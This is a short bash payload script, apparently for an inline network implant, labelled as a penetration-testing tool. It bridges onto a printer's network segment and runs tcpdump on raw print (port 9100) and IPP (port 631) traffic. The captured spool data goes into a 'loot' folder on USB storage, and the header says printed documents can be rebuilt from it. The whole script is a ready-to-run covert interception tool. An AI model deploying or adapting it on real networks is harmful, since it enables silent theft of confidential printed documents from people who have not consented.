#!/bin/bash
# 
# Title:        Print Spool Sniffer
# Description:  Captures Raw Print (port 9100) and IPP (port 631) traffic.
# Author:       James Cupps
# Version:      1.0
# Category:     pentest
# Target:       Network Printers
# Net Mode:     BRIDGE
#
# USE CASE: Most workstations send print jobs unencrypted. Drop this inline with
#           a shared printer and capture the spool files. The resulting PCAP can
#           be parsed to reconstruct printed documents.

function run_spool_sniffer() {
    NETMODE BRIDGE
    mkdir -p /usb/loot/print_jobs &> /dev/null
    sleep 5
    
    LED SPECIAL

    # Filter for standard printer ports (Raw/JetDirect and IPP)
    tcpdump -i br-lan -s 0 "tcp port 9100 or tcp port 631" -w /usb/loot/print_jobs/spool_$(date +%Y%m%d_%H%M).pcap &>/dev/null &
    tpid=$!
    
    NO_LED=true BUTTON
    kill $tpid
    sync
    LED G SUCCESS
}

USB_WAIT
run_spool_sniffer &
wait
